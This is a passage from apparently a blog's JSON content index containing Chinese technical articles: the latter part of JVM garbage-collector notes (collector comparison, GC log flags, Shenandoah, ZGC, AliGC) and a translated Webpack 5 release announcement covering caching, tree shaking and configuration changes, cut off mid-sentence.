Serial       | 串行运行       | 新生代         | 复制算法                | 响应速度优先 | 适用于单 CPU 环境下的 Client 模式        |\n| ParNew       | 并行运行       | 新生代         | 复制算法                | 响应速度优先 | 多 CPU 环境 Server 模式下与 CMS 配合使用 |\n| Parallel     | 并行运行       | 新生代         | 复制算法                | 吞吐量优先   | 适用于后台运算而不需要太多交互的场景     |\n| Serial Old   | 串行运行       | 老年代         | 标记-压缩算法           | 响应速度优先 | 适用于单 CPU 环境下的 Client 模式        |\n| Parallel Old | 并行运行       | 老年代         | 标记-压缩算法           | 吞吐量优先   | 适用于后台运算而不需要太多交互的场景     |\n| CMS          | 并发运行       | 老年代         | 标记-清除算法           | 响应速度优先 | 适用于互联网或 B/S 业务                  |\n| G1           | 并发、并行运行 | 新生代、老年代 | 标记-压缩算法、复制算法 | 响应速度优先 | 面向服务端应用                           |\n\nGC 发展阶段\n\nSerial → Parallel → CMS → G1 → ZGC\n\n### 怎么选择垃圾回收器\n\nJava 垃圾收集器的配置对于 JVM 优化来说是一个很重要的选择，选择合适的垃圾收集器可以让 JVM 的性能有一个很大的提升。怎么选择垃圾收集器？\n\n1. 优先调整堆的大小让 JVM 自适应完成。\n2. 如果内存小于 100M，使用串行收集器\n3. 如果是单核、单机程序，并且没有停顿时间的要求，串行收集器\n4. 如果是多 CPU、需要高吞吐量、允许停顿时间超过 1 秒，选择并行或者 JVM 自己选择\n5. 如果是多 CPU、追求低停顿时间，需快速响应（比如延迟不能超过 1 秒，如互联网应用），使用并发收集器\n6. 官方推荐 G1，性能高。现在互联网的项目，基本都是使用 G1。\n\n最后需要明确一个观点：\n\n1. 没有最好的收集器，更没有万能的收集算法\n2. 调优永远是针对特定场景、特定需求，不存在一劳永逸的收集器\n\n### 面试\n\n1. 对于垃圾收集，面试官可以循序渐进从理论、实践各种角度深入，也未必是要求面试者什么都懂。但如果你懂得原理，一定会成为面试中的加分项。这里较通用、基础性的部分如下：\n   - 垃圾收集的算法有哪些？如何判断一个对象是否可以回收？\n   - 垃圾收集器工作的基本流程。\n2. 另外，大家需要多关注垃圾回收器这一章的各种常用的参数\n\n## GC 日志分析\n\n### GC 日志参数设置\n\n**通过阅读GC日志，我们可以了解Java虚拟机内存分配与回收策略。**\n\n内存分配与垃圾回收的参数列表\n\n1. -XX:+PrintGC ：输出GC日志。类似：-verbose:gc\n2. -XX:+PrintGCDetails ：输出GC的详细日志\n3. -XX:+PrintGCTimestamps ：输出GC的时间戳（以基准时间的形式）\n4. -XX:+PrintGCDatestamps ：输出GC的时间戳（以日期的形式，如2013-05-04T21: 53: 59.234 +0800）\n5. -XX:+PrintHeapAtGC ：在进行GC的前后打印出堆的信息\n6. -Xloggc:…/logs/gc.log ：日志文件的输出路径\n\n### GC 日志查看工具\n\nGCViewer、GCEasy、GCHisto、GCLogViewer、Hpjmeter、garbagecat 等\n\n### GC 日志补充说明\n\n1. \"[GC\" 和 \"[Full GC\" 说明了这次垃圾收集的停顿类型，如果有 Full 则说明 GC 发生了 \"Stop The World\"\n2. 使用 Serial 收集器在新生代的名字是 Default New Generation，因此显示的是 \"[DefNew\"\n3. 使用 ParNew 收集器在新生代的名字会变成 \"ParNew\"，意思是 \"Parallel New Generation\"\n4. 使用 Parallel scavenge 收集器在新生代的名字是 \"PSYoungGen\"\n5. 老年代的收集和新生代道理一样，名字也是收集器决定的\n6. 使用 G1 收集器的话，会显示为 \"garbage-first heap\"\n7. Allocation Failure 表明本次引起 GC 的原因是因为在年轻代中没有足够的空间能够存储新的数据了。\n8. [PSYoungGen: 5986K->696K(8704K) ] 5986K->704K (9216K)\n   - 中括号内：GC 回收前年轻代大小，回收后大小，（年轻代总大小）\n   - 括号外：GC 回收前年轻代和老年代大小，回收后大小，（年轻代和老年代总大小）\n9. user 代表用户态回收耗时，sys 内核态回收耗时，real 实际耗时。由于多核线程切换的原因，时间总和可能会超过 real 时间\n\n\n\n## 垃圾回收器的新发展\n\n### 垃圾回收器的发展过程\n\nGC 仍然处于飞速发展之中，目前的默认选项 G1 GC 在不断的进行改进，很多我们原来认为的缺点，例如串行的 Full GC、Card Table 扫描的低效等，都已经被大幅改进，例如，JDK10 以后，Full GC 已经是并行运行，在很多场景下，其表现还略优于 Parallel GC 的并行 Full GC 实现。 \n\n即使是 Serial GC，虽然比较古老，但是简单的设计和实现未必就是过时的，它本身的开销，不管是GC相关数据结构的开销，还是线程的开销，都是非常小的，所以随着云计算的兴起，**在 Serverless 等新的应用场景下，Serial GC 找到了新的舞台。**\n\n比较不幸的是 CMS GC，因为其算法的理论缺陷等原因，虽然现在还有非常大的用户群体，但在 JDK 9 中已经被标记为废弃，并在 JDK 14 版本中移除。\n\n现在 G1 回收器已成为默认回收器好几年了。我们还看到了引入了两个新的收集器：ZGC（JDK 11出现）和 Shenandoah（Open JDK 12），其特点：主打低停顿时间。\n\n### Shenandoah GC\n\n**Open JDK12的Shenandoash GC：低停顿时间的GC（实验性）**\n\nShenandoah 无疑是众多 GC 中最孤独的一个。是第一款不由 Oracle 公司团队领导开发的 Hotspot 垃圾收集器。不可避免的受到官方的排挤。比如号称 openJDK 和 OracleJDK 没有区别的 Oracle 公司仍拒绝在 Oracle JDK12 中支持 Shenandoah。\n\nShenandoah 垃圾回收器最初由 RedHat 进行的一项垃圾收集器研究项目 Pauseless GC 的实现，旨在针对 JVM 上的内存回收实现低停顿的需求。在 2014 年贡献给 OpenJDK。\n\nRed Hat 研发 Shenandoah 团队对外宣称，Shenandoah 垃圾回收器的暂停时间与堆大小无关，这意味着无论将堆设置为 200MB 还是200GB，99.9% 的目标都可以把垃圾收集的停顿时间限制在十毫秒以内。不过实际使用性能将取决于实际工作堆的大小和工作负载。\n\n![shenandoah-benchmark](https://up-img.yonghong.tech/pic/2021/05/12-20-51-shenandoah-benchmark-XybNYb.png)\n\n这是 RedHat 在 2016 年发表的论文数据，测试内容是使用 ES 对 200GB 的维基百科数据进行索引。从结果看：\n\n1. 停顿时间比其他几款收集器确实有了质的飞跃，但也未实现最大停顿时间控制在十毫秒以内的目标。\n2. 而吞吐量方面出现了明显的下降，总运行时间是所有测试收集器里最长的。\n\n总结\n\n1. Shenandoah GC 的弱项：高运行负担下的吞吐量下降。\n2. Shenandoah GC 的强项：低延迟时间。\n\n相关解读：尚硅谷宋红康Java12&13新特性教程(深入解读java12&13)\n\nhttps://www.bilibili.com/video/BV1jJ411M7kQ\n\n### 令人震惊、革命性的 ZGC\n\n官方文档：https://docs.oracle.com/en/java/javase/12/gctuning/\n\nZGC 与 Shenandoah 目标高度相似，在尽可能对吞吐量影响不大的前提下，实现在任意堆内存大小下都可以把垃圾收集的停颇时间限制在十毫秒以内的低延迟。\n\n《深入理解Java虚拟机》一书中这样定义 ZGC：ZGC 收集器是一款基于 Region 内存布局的，（暂时）不设分代的，使用了读屏障、染色指针和内存多重映射等技术来实现**可并发的标记-压缩算法**的，以**低延迟为首要目标**的一款垃圾收集器。\n\nZGC 的工作过程可以分为 4 个阶段：**并发标记 - 并发预备重分配 - 并发重分配 - 并发重映射** 等。\n\nZGC 几乎在所有地方并发执行的，除了**初始标记的是 STW 的**。所以停顿时间几乎就耗费在初始标记上，这部分的实际时间是非常少的。\n\n\n\n在 ZGC 的强项停顿时间测试上，它毫不留情的将 Parallel、G1 拉开了两个数量级的差距。无论平均停顿、95% 停顿、99.8% 停顿、99. 98% 停顿，还是最大停顿时间，ZGC 都能毫不费劲控制在 10 毫秒以内。\n\n虽然 ZGC 还在试验状态，没有完成所有特性，但此时性能已经相当亮眼，用“令人震惊、革命性”来形容，不为过。未来将在服务端、大内存、低延迟应用的首选垃圾收集器。\n\n### 面向大堆的 AliGC\n\nAliGC 是阿里巴巴 JVM 团队基于 G1 算法，面向大堆（LargeHeap）应用场景。指定场景下的对比：\n\n\n![12-20-51-aligc_1-FPAp6p](https://up-img.yonghong.tech/pic/2021/05/12-20-51-aligc_1-FPAp6p.png)\n\n![12-20-51-aligc_2-CKMw3y](https://up-img.yonghong.tech/pic/2021/05/12-20-51-aligc_2-CKMw3y.png)\n\n","categories":["Java进阶"],"tags":["Java进阶","JVM"]},{"title":"Webpack 5 发布了，可能升级失败，但请多给些尝试的机会！ (2020-10-10)","url":"/release/webpack-5-0/","content":"\nwebpack 4 于 2018 年 2 月发布。\n从那时起，我们在没有重大更新的情况下，推出了很多功能。\n我们知道，人们不喜欢带有突破性的重大变化。\n尤其是 webpack，人们通常一年只接触两次，剩下的时间就 \"只管用\"了。\n但是，在不做突破性改动的情况下推出功能也是有成本的：\n我们不能做重大的 API 或架构改进。\n\n所以时不时就会有一个点，困难堆积起来，我们不得不做突破性的改动，才不至于把一切都搞乱。\n这时候就需要一个新的主要版本了。\n所以 webpack 5 包含了这些架构上的改进，以及没有这些改进就不可能实现的功能。\n\n这个主要版本也是修改一些默认值的机会，并与此同时出现的建议和规范保持一致。\n\n所以今天（2020-10-10）webpack 5.0.0 发布了，但这并不意味着它已经完成了，没有 bug，甚至功能完整。\n就像 webpack 4 一样，我们通过修复问题和增加功能来继续开发。\n在接下来的日子里，可能会有很多 bug 修复。功能会在以后出现。\n\n<!-- more -->\n## 疑问解答\n\n### 那么发布意味着什么呢？\n\n这意味着我们完成了重大的变更。\n许多重构已经完成，以提高架构的水平，并为未来的功能（和当前的功能）创建一个良好的基础。\n\n### 那么什么时候是升级的时候呢？\n\n这要看情况。有一个很好的机会，升级失败，你需要给它第二次或第三次尝试。\n如果你愿意的话，现在就尝试升级，并向 webpack、插件和加载器提供反馈。\n我们很想解决这些问题。总得有人开始，而你将是第一批受益者之一。\n\n## 赞助情况 \n\nwebpack 是完全基于[赞助](https://opencollective.com/webpack)的。\n它不像其他一些开源项目那样与大公司挂钩（并由其支付费用）。\n99% 的赞助收入是根据贡献者和维护者的贡献来分配的。\n我们相信将这些钱投资于使 webpack 变得更好。\n\n但是由于疫情的原因，公司已经不怎么愿意赞助了。\n在这种情况下，Webpack 也受到了影响（就像许多其他公司和人一样）。\n\n我们从来没有能力支付给我们的贡献者我们认为他们应得的金额，但现在我们只有一半的钱，所以我们需要更严重的削减。\n在情况好转之前，我们将只向贡献者和维护者支付前 10 天或每个月的工资。\n其余的日子，他们可以自愿工作，由雇主支付工资，从事其他工作，或者休息一些日子。\n这样我们就可以在前 10 天的工作中支付更多相当于投入时间的报酬。\n\n我们最感激的是 [trivago](https://tech.trivago.com/opensource)，他们在过去的 3 年里为 webpack 提供了大量的赞助。\n遗憾的是，由于受到 Covid-19 的冲击，他们今年无法继续赞助了。\n希望有其他公司站出来，跟随这些（巨头）的脚步。\n\n感谢所有的赞助者。\n\n## 整体方向 \n\n这个版本的重点在于以下几点。\n\n- 尝试用持久性缓存来提高构建性能。\n- 尝试用更好的算法和默认值来改进长期缓存。\n- 尝试用更好的 Tree Shaking 和代码生成来改善包大小。\n- 尝试改善与网络平台的兼容性。\n- 尝试在不引入任何破坏性变化的情况下，清理那些在实现 v4 功能时处于奇怪状态的内部结构。\n- 试图通过现在引入突破性的变化来为未来的功能做准备，使其能够尽可能长时间地保持在 v5 版本上。\n\n## **迁移**指南 \n\n[在这里可查阅迁移指南](https://webpack.docschina.org/migrate/5)\n\n## 重大变更: 功能清除 \n\n### 清理弃用的能力 \n\n所有在 v4 中被废弃的能力都被移除。\n\n迁移: 确保你的 webpack 4 构建没有打印废弃警告。\n\n以下是一些被移除但在 v4 中没有废弃警告的东西：\n\n- IgnorePlugin 和 BannerPlugin 现在必须只传递一个参数，这个参数可以是对象、字符串或函数。\n\n### 废弃代码 \n\n新的弃用包括一个弃用代码，这样他们更容易被引用。\n\n### 语法废弃 \n\n`require.include`已被废弃，使用时默认会发出警告。\n\n可以通过 `Rule.parser.requireInclude` 将行为改为允许、废弃或禁用。\n\n### 不再为 Node.js 模块 自动引用 Polyfills \n\n在早期，webpack 的目的是为了让大多数的 Node.js 模块运行在浏览器中，但如今模块的格局已经发生了变化，现在许多模块主要是为前端而编写。webpack <= 4 的版本中提供了许多 Node.js 核心模块的 polyfills，一旦某个模块引用了任何一个核心模块（如 `cypto` 模块），webpack 就会自动引用这些 polyfills。\n\n尽管这会使得使用为 Node.js 编写模块变得容易，但它在构建时给 bundle 附加了庞大的 polyfills。在大部分情况下，这些 polyfills 并非必须。\n\n从 webpack 5 开始不再自动填充这些 polyfills，而会专注于前端模块兼容。我们的目标是提高 web 平台的兼容性。\n\n迁移：\n\n- 尽量使用前端兼容的模块。\n- 可以手动为 Node.js 核心模块添加 polyfill。错误提示会告诉你如何实现。\n- Package 作者：在 `package.json` 中添加 `browser` 字段，使 package 与前端兼容。为浏览器提供其他的实现/dependencies。\n\n## 重大变更：长期缓存 \n\n### 确定的 Chunk、模块 ID 和导出名称 \n\n新增了长期缓存的算法。这些算法在生产模式下是默认启用的。\n\n`chunkIds: \"deterministic\"`\n`moduleIds: \"deterministic\"`\n`mangleExports: \"deterministic\"`\n\n该算法以确定性的方式为模块和分块分配短的（3 或 5 位）数字 ID，\n这是包大小和长期缓存之间的一种权衡。\n\n`moduleIds/chunkIds/mangleExports: false` 禁用默认行为，你可以通过插件提供一个自定义算法。请注意，在 webpack 4 中，`moduleIds/chunkIds: false` 如果没有自定义插件，则可以正常运行，而在 webpack 5 中，你必须提供一个自定义插件。\n\n**迁移**：最好使用 `chunkIds`、`moduleIds` 和 `mangleExports` 的默认值。你也可以选择使用旧的默认值`chunkIds: \"size\"，moduleIds: \"size\", mangleExports: \"size\"`，这将会生成更小的包，但为了缓存，会更频繁地将其失效。\n\n注意：在 webpack 4 中，散列的模块 id 会导致 gzip 性能降低。这与模块顺序的改变有关，已经被修正。\n\n注意：在 webpack 5 中，`deterministic` Ids 在生产模式下是默认启用的。\n\n### 真正的内容哈希 \n\n当使用 `[contenthash]` 时，Webpack 5 将使用真正的文件内容哈希值。之前它 \"只\" 使用内部结构的哈希值。\n当只有注释被修改或变量被重命名时，这对长期缓存会有积极影响。这些变化在压缩后是不可见的。\n\n## 重大变更：开发支持 \n\n### 命名代码块 ID \n\n在开发模式下，默认启用的新命名代码块 ID 算法为模块（和文件名）提供了人类可读的名称。\n模块 ID 由其路径决定，相对于 `context`。\n代码块 ID 由代码块的内容决定。\n\n所以你不再需要使用`import(/* webpackChunkName: \"name\" */ \"module\")`来调试。\n但如果你想控制生产环境的文件名，还是有意义的。\n\n可以在生产环境中使用 `chunkIds: \"named\"` 在生产环境中使用，但要确保不要不小心暴露模块名的敏感信息。\n\n迁移：如果你不喜欢在开发中改变文件名，你可以通过 `chunkIds: \"natural\"` 来使用旧的数字模式。\n\n### 模块联邦 \n\nWebpack 5 增加了一个新的功能 \"模块联邦\"，它允许多个 webpack 构建一起工作。\n从运行时的角度来看，多个构建的模块将表现得像一个巨大的连接模块图。\n从开发者的角度来看，模块可以从指定的远程构建中导入，并以最小的限制来使用。\n\n更多细节请参见[本单独指南](https://webpack.docschina.org/concepts/module-federation)。\n\n## 重大变更：支持崭新的 Web 平台特性 \n\n### JSON 模块 \n\nJSON 模块现在与提案保持一致，并在使用非默认导出时发出警告。\n当从严格的 ECMAScript 模块导入时，JSON 模块不再有命名的导出。\n\n迁移: 使用默认导出。\n\n即使使用默认导出，未使用的属性也会被 `optimization.usedExports` 优化丢弃，属性会被 `optimization.mangleExports` 优化打乱。\n\n可以在 `Rule.parser.parse` 中指定一个自定义的 JSON 解析器来导入类似 JSON 的文件（例如针对 toml、yaml、json5 等）。\n\n### import.meta \n\n- `import.meta.webpackHot` 是 `module.hot` 的别名，在严格的 ESM 中也可以使用。\n- `import.meta.webpack` 是 webpack 的主要版本号。\n- `import.meta.url` 是当前文件的 `file:` url(类似于`__filename`，但作为文件 url)。\n\n### 资源模块 \n\nWebpack 5 现在已经对表示资源的模块提供了内置支持。\n这些模块可以向输出文件夹发送一个文件，或者向 javascript 包注入一个 DataURI。\n无论哪种方式，它们都会给出一个 URL 来工作。\n\n它们可以通过多种方式被使用：\n\n- `import url from \"./image.png\"` 和 在`module.rule` 中设置 `type: \"asset\"` 当匹配这样的导入时。(老方法)\n- `new URL(\"./image.png\", import.meta.url)` (新方式)\n\n选择 \"新的方式 \"语法是为了允许在没有打包工具的情况下运行代码。这种语法也可以在浏览器中的原生 ECMAScript 模块中使用。\n\n### 原生 Worker 支持 \n\n当把资源的 `new URL` 和 `new Worker`/`new SharedWorker`/`navigator.serviceWorker.register` 结合起来时，webpack 会自动为 web worker 创建一个新的入口点（entrypoint）。\n\n`new Worker(new URL(\"./worker.js\", import.meta.url))`\n\n选择这种语法也是为了允许在没有打包工具的情况下运行代码。这种语法在浏览器的原生 ECMAScript 模块中也可以使用。\n\n### URIs \n\nWebpack 5 支持在请求中处理协议。\n\n- 支持`data:`。支持 Base64 或原始编码。Mimetype 可以在`module.rule`中被映射到加载器和模块类型。例如：`import x from \"data:text/javascript,export default 42\"`。\n- 支持`file:`。\n- 支持`http(s):`，但需要通过`new webpack.experiments.s schemesHttp(s)UriPlugin()`选择加入。\n    - 默认情况下，当目标为 \"web \"时，这些 URI 会导致对外部资源的请求（它们是外部资源）。\n\n支持请求中的片段。例如：`./file.js#fragment`。\n\n### 异步模块 \n\nWebpack 5 支持所谓的 \"异步模块\"。\n这些模块并不是同步解析的，而是基于异步和 Promise 的。\n\n通过 \"import \"导入它们会被自动处理，不需要额外的语法，而且几乎看不出区别。\n\n通过`require()`导入它们会返回一个解析到导出的 Promise。\n\n在 webpack 中，有多种方式来拥有异步模块。\n\n- 异步的外部资源(async externals)\n- 新规范中的 WebAssembly 模块\n- 使用顶层 Await 的 ECMAScript 模块。\n\n### 外部资源 \n\nWebpack 5 增加了更多的外部类型来覆盖更多的应用：\n\n`promise`: 一个评估为 Promise 的表达式。外部模块是一个异步模块，解析值作为模块导出使用。\n\n`import`。原生的 `import()` 用于加载指定的请求，外部模块是一个异步模块，解析值作为模块导出。外部模块是一个异步模块。\n\n`module`: 尚未实现，但计划通过 `import x from \"...\"` 加载模块。\n\n`script`: 通过 `<script>` 标签加载一个 url，并从一个全局变量（以及它的可选属性）中获取输出。外部模块是一个异步模块。\n\n## 重大变更：支持全新的 Node.js 生态特性 \n\n### 解析 \n\n现在支持 package.json 中的 `exports` 和 `imports` 字段。\n\n原生支持 Yarn PnP。\n\n更多细节请参见[package exports](https://webpack.docschina.org/guides/package-exports/)。\n\n## 重大变更：开发体验 \n\n### 经过优化的构建目标(target) \n\nWebpack 5 允许传递一个目标列表，并且支持目标的版本。\n\n例如 ` target: \"node14\"``target: [\"web\", \"es2020\"] `。\n\n这是一个简单的方法，为 webpack 提供它需要确定的所有信息：\n\n- 代码块加载机制，以及\n- 支持的语法，如箭头函数\n\n### Stats \n\n改进了统计测试格式的可读性和冗余性。改进了默认值，使其不那么冗长，也适合大型构建。\n\n- 现在默认情况下，代码块关系是隐藏的，可以用 `stats.chunkRelations` 来切换。\n- Stats 现在可以区分 `files` 和 `auxiliaryFiles`。\n- Stats 现在默认隐藏模块和代码块的 id。这可以通过 `stats.ids` 来切换。\n- 现在所有模块的列表是按照到入口点的距离排序的。这可以通过 `stats.modulesSort` 来改变。\n- 代码块模块的列表现在按模块名称排序。这可以通过 `stats.chunkModulesSort` 来改变。\n- 嵌套模块的列表现在是按拓扑结构排序的。这可以通过 `stats.nestedModulesSort` 来改变。\n- 现在，代码块和资源会显示代码块 id 提示。\n- 资产和模块将以树状而不是列表/表格的形式显示。\n- 一般信息现在会在最后的摘要中显示。它显示了 webpack 版本，配置名称和警告/错误计数。\n- 哈希值现在默认是隐藏的。这可以通过 `stats.hash` 来改变。\n- 默认情况下不再显示构建的时间戳，这可以通过 `stats.builtAt` 开启。它会在摘要中显示时间戳。\n- 默认情况下，不再显示子编译。它们可以用 `stats.children` 来显示。\n\n### 进度 \n\n对 `ProgressPlugin` 做了一些改进，它被 CLI 在参数 `--progress` 开启时使用，但也可以作为插件手动使用。\n\n以前它只计算已处理的模块。现在它可以计算 \"入口\"、\"依赖\" 和 \"模块\"。\n现在所有的模块都默认显示了。\n\n以前它只显示当前处理的模块。这造成了很多 stderr 输出，在一些控制台上产生了性能问题。\n现在这个功能被默认关闭（`activeModules` 选项）。这也减少了控制台的垃圾信息量。\n现在，在构建模块的过程中，向 stderr 写入的时间被控制在 500ms 以内。\n\n剖析模式也得到了升级，将显示嵌套进度消息的时间。\n这使得它更容易弄清楚，当插件导致了性能问题。\n\n新增加的 `percentBy` -选项告知 `ProgressPlugin` 如何计算进度百分比。\n\n```js\nnew webpack.ProgressPlugin({ percentBy: 'entries' });\n```\n\n为了使进度百分比更准确，`ProgressPlugin` 会缓存最后已知的总模块数，并在下一次构建时重新使用这个值。第一次构建将预热缓存，但后续构建将使用并更新这个值。\n\n### 自动添加唯一命名 \n\n在 webpack 4 中，多个 webpack 运行时可能会在同一个 HTML 页面上发生冲突，因为它们使用同一个全局变量进行代码块加载。为了解决这个问题，需要为 `output.jsonpFunction` 配置提供一个自定义的名称。\n\nWebpack 5 确实会从 `package.json` `name` 中自动推断出一个唯一的构建名称，并将其作为 `output.uniqueName` 的默认值。\n\n这个值用于使所有潜在的冲突的全局变量成为唯一。\n\n迁移: 由于 `package.json` 中有唯一的名称，可将 `output.jsonpFunction` 删除。\n\n### 自动添加公共路径 \n\nWebpack 5 会在可能的情况下自动确定 `output.publicPath`。\n\n### Typescript 类型 \n\nWebpack 5 从源码中生成 typescript 类型，并通过 npm 包暴露它们。\n\n迁移：删除`@types/webpack`。当名称不同时更新引用。\n\n## 重大变更: 构建优化 \n\n### 嵌套的 tree-shaking \n\nwebpack 现在能够跟踪对导出的嵌套属性的访问。这可以改善重新导出命名空间对象时的 Tree Shaking（清除未使用的导出和混淆导出）。\n\n```js\n// inner.js\nexport const a = 1;\nexport const b = 2;\n\n// module.js\nexport * as inner from './inner';\n// 或 import * as inner from './inner'; export { inner };\n\n// user.js\nimport * as module from './module';\nconsole.log(module.inner.a);\n```\n\n在这个例子中，可以在生产模式下删除导出的`b`。\n\n### 内部模块 tree-shaking \n\nwebpack 4 没有分析模块的导出和引用之间的依赖关系。webpack 5 有一个新的选项 `optimization.innerGraph`，在生产模式下是默认启用的，它可以对模块中的标志进行分析，找出导出和引用之间的依赖关系。\n\n在这样的模块中：\n\n```js\nimport { something } from './something';\n\nfunction usingSomething() {\n  return something;\n}\n\nexport function test() {\n  return usingSomething();\n}\n```\n\n内部依赖图算法会找出 `something` 只有在使用 `test` 导出时才会使用。这允许将更多的出口标记为未使用，并从代码包中省略更多的代码。\n\n当设置`\"sideEffects\": false`时，可以省略更多的模块。在这个例子中，当 `test` 导出未被使用时，`./something` 将被省略。\n\n要获得未使用的导出信息，需要使用 `optimization.unusedExports`。要删除无副作用的模块，需要使用`optimization.sideEffects`。\n\n可以分析以下标记。\n\n- 函数声明\n- 类声明\n- `默认导出export default` 或定义变量以下的：\n    - 函数表达式\n    - 类表达式\n    - 顺序表达式\n    - `/*#__PURE__*/` 表达式\n    - 局部变量\n    - 引入的捆绑(bindings)\n\n反馈：如果你发现这个分析中缺少什么，请报告一个问题，我们会考虑增加它。\n\n使用 `eval()` 将为一个模块放弃这个优化，因为经过 eval 的代码可以引用范围内的任何标记。\n\n这种优化也被称为深度范围分析。\n\n### CommonJs Tree Shaking \n\nwebpack 曾经不进行对 CommonJs 导出和 `require()` 调用时的导出使用分析。\n\nwebpack 5 增加了对一些 CommonJs 构造的支持，允许消除未使用的 CommonJs 导出，并从 `require()` 调用中跟踪引用的导出名称。\n\n支持以下构造：\n\n- `exports|this|module.exports.xxx = ...`\n- `exports|this|module.exports = require(\"...\")` (reexport)\n- `exports|this|module.exports.xxx = require(\"...\").xxx` (reexport)\n- `Object.defineProperty(exports|this|module.exports, \"xxx\", ...)`\n- `require(\"abc\").xxx`\n- `require(\"abc\").xxx()`\n- 从 ESM 导入\n- `require()` 一个 ESM 模块\n- 被标记的导出类型 (对非严格 ESM 导入做特殊处理):\n    - `Object.defineProperty(exports|this|module.exports, \"__esModule\", { value: true|!0 })`\n    - `exports|this|module.exports.__esModule = true|!0`\n- 未来计划支持更多的构造\n\n当检测到不可分析的代码时，webpack 会放弃，并且完全不跟踪这些模块的导出信息（出于性能考虑）。\n\n### 副作用分析 \n\n在 package.json 中的 `\"sideEffects\"` 标志允许手动将模块标记为无副作用，这就允许在不使用时放弃它们。\n\nwebpack 5 也可以根据对源代码的静态分析，自动将模块标记为无副作用。\n\n### 每个运行时的优化 \n\nWebpack 5 现在能够（默认情况下也是如此）分析和优化每个运行时的模块（一个运行时通常等于一个入口点）。\n这允许只在真正需要的地方导出这些入口点。\n入口点之间不会相互影响 (只要每个入口点使用一个运行时)\n\n### 模块合并 \n\n模块合并也可以在每个运行时工作，允许每个运行时进行不同的合并\n\n模块合并已经成为一等公民，现在任何模块和依赖都可以实现它。\n在初始时 webpack 5 已经添加了对 ExternalModules 和 json 模块的支持，更多的模块可能很快就会发布。\n\n### 通用 Tree Shaking 改进 \n\n`export *` 已经得到改进，可以跟踪更多的信息，并且不再将`默认`导出标记为使用。\n\n`export *` 现在会在 webpack 确定有冲突的导出时显示警告。\n\n`import()` 允许通过 `/* webpackExports: [\"abc\", \"default\"] */` 该魔法注释手动 tree shake 模块。\n\n### 开发与生产的一致性问题 \n\n我们试图通过改善两种模式的相似性，在开发模式的构建性能和避免仅在生产模式的产生的问题之间找到一个很好的平衡点。\n\nWebpack 5 默认在两种模式下都启用了 \"sideEffects \"优化。在 webpack 4 中，由于 package.json 中的`\"sideEffects\"`标记不正确，这种优化导致了一些只在生产模式下出现的错误。在开发过程中启用这个优化可以更快更容易地发现这些问题。\n\n在很多情况下，开发和生产都是在不同的操作系统上进行的，文件系统的大小写敏感度不同，所以 webpack 5 增加了一些奇怪的大小写的警告/错误。\n\n### 改进代码生成 \n\n当 ASI 发生时，webpack 会检测到，当没有分号插入时，会生成更短的代码。`Object(...)`->`(0, ...)`。\n\nwebpack 将多个导出的 getters 合并为一个运行时函数调用。`r.d(x, \"a\", () => a); r.d(x, \"b\", () => b);` -> `r.d(x, {a: () => a, b: () => b});`。\n\n现在在 `output.environment` 中有额外的选项。\n它们允许指定哪些 ECMAScript 特性可以用于 webpack 生成的运行时代码。\n\n通常人们不会直接指定这个选项，而是会使用 `target` 选项。\n\nwebpack 4 之前只生成 ES5 的代码。\nwebpack 5 则现在既可以生成 ES5 又可以生成 ES6/ES2015 代码。\n\n只支持现代浏览器，将使用箭头函数生成更短的代码，使用 `const` 声明与 TDZ 为 `export default` 生成更符合规范的代码。\n\n### 改进 `target` 配置 \n\n在 webpack 4 中，\"target \"是在 `\"web\"` 和 `\"node\"` 之间的一个粗略的选择（还有一些其他的）。\nWebpack 5 给你更多的选择。\n\n`target`选项现在比以前影响了更多关于生成代码的事情。\n\n- 代码块加载方法\n- 代码块的格式\n- wasm 加载方法\n- 代码块与 wasm 在 workers 中加载方法\n- 被使用的全局对象\n- publicPath 是否应该被自动确定\n- 生成的代码中使用的 ECMAScript 特性/语法\n- `externals` 是否默认被启用\n- 一些 Node.js 兼容层的行为(`global`, `__filename`, `__dirname`)\n- 模块解析(`browser` 字段、`exports` 和 `imports` 条件)\n- 一些加载器可能会基于此改变行为\n\n对于其中的一些情况，在 `\"web\"` 和 `\"node\"` 之间的选择过于粗略，我们需要更多的信息。\n因此，我们允许指定最低版本，例如 `\"node10.13\"`，并推断出更多关于目标环境的属性。\n\n现在也允许用一个数组组合多个目标，webpack 将确定所有目标的最小属性。使用数组也很有用，当使用像 `\"web\"` 或 `\"node\"` 这样没有提供完整信息的目标时（没有版本号）。例如，`[\"web\", \"es2020\"]` 结合了这两个部分目标。\n\n有一个目标 `\"browserslist\"`，它将使用 browserslist 类库的数据来确定环境的属性。\n当项目中存在可用的 browserslist 配置时，这个目标也会被默认使用。当没有可用的配置时，默认使用 `\"web\"` 目标。\n\n有些组合和功能还没有实现，会导致错误。它们是为未来的功能做准备。例如：\n\n- `[\"web\", \"node\"]` 将导致一个通用的代码块加载方法，而这个方法还没有实现。\n- `[\"web\", \"node\"]` + `output.module: true`将导致一个模块代码块加载方法，该方法尚未实现。\n- `\"web\"`会导致`http(s):`的导入被视为`模块`外部资源，而这些外部还没有实现(变通方法：`externalsPresets.{ web: false, webAsync: true }`，将使用`import()`代替)。\n\n### 代码块拆分与模块大小 \n\n现在模块的尺寸比单一的数字更好的表达方式。现在有不同类型的大小。\n\nSplitChunksPlugin 现在知道如何处理这些不同的大小，并将它们用于 `minSize` 和 `maxSize`。\n默认情况下，只有 `javascript` 大小被处理，但你现在可以传递多个值来管理它们：\n\n```js\nmodule.exports = {\n  optimization: {\n    splitChunks: {\n      minSize: {\n        javascript: 30000,\n        webassembly: 50000,\n      },\n    },\n  },\n};\n```\n\n你仍然可以使用一个数字来表示大小。在这种情况下，webpack 会自动使用默认的大小类型。\n\n`mini-css-extract-plugin` 使用 `css/mini-extra` 作为大小类型，并将此大小类型自动添加到默认类型中。\n\n## 重大变更：性能优化 \n\n### 持久缓存 \n\n现在有一个文件系统缓存。它是可选的，可以通过以下配置启用：\n\n```js\nmodule.exports = {\n  cache: {\n    // 1. 将缓存类型设置为文件系统\n    type: 'filesystem',\n\n    buildDependencies: {\n      // 2. 将你的 config 添加为 buildDependency，以便在改变 config 时获得缓存无效\n      config: [__filename],\n\n      // 3. 如果你有其他的东西被构建依赖，你可以在这里添加它们\n      // 注意，webpack、加载器和所有从你的配置中引用的模块都会被自动添加\n    },\n  },\n};\n```\n\n重要说明：\n\n默认情况下，webpack 假定 webpack 所在的 `node_modules` 目录只被包管理器修改。对 `node_modules` 来说，哈希值和时间戳会被跳过。\n出于性能考虑，只使用包名和版本。\n只要不指定`resolve.symlinks: false`，Symlinks(即`npm/yarn link`)就没有问题(无论如何都要避免)。\n不要直接编辑 